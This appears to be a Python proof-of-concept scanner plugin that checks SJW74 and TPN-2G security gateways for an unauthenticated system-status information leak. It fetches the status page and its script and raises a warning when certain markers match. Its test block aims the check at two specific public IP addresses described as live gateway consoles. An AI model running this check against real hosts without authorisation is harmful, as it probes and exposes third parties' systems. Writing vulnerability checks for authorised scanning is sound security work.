#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  SJW74系列安全网关 和 全网行为管理TPN-2G安全网关 系统状态泄露
Author    :  a
mail      :  a@lcx.cc
 
refer :  0day

    Ext.Ajax.request({
	    url:"../FlowInfoServlet?random="+(new Date()).getTime(),
	    method : 'POST',
	    success : function(response) {
		    var msg=response.responseText;
		    chartFlow.series[0].setData(eval("["+msg+"]")[1]);  
		    chartFlow.series[1].setData(eval("["+msg+"]")[0]);  
	    },
	    failure : function(response) {
		    //alert(response.responseText)
	    }


	    
"""
import urlparse
import time

def assign(service, arg):
    if service == 'adtsec_gateway':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
     
    url = arg + 'system/status.html'
    code2, head, res, errcode, _ = curl.curl2(url )
    if 'infoMechine' in res and 'status.js'   in res:
        code2, head, res, errcode, _ = curl.curl2(arg +'system/status.js' )
        if 'getLisence' in res and 'FlowInfoServlet?random' in res:
                security_warning(url)
    
   

if __name__ == '__main__':
    from dummy import *
    audit(assign('adtsec_gateway', 'http://211.144.102.114:8080')[1]) # TPN-2G网关控制台
    audit(assign('adtsec_gateway', 'http://60.174.80.249:8080')[1]) #SJW74 VPN网关控制台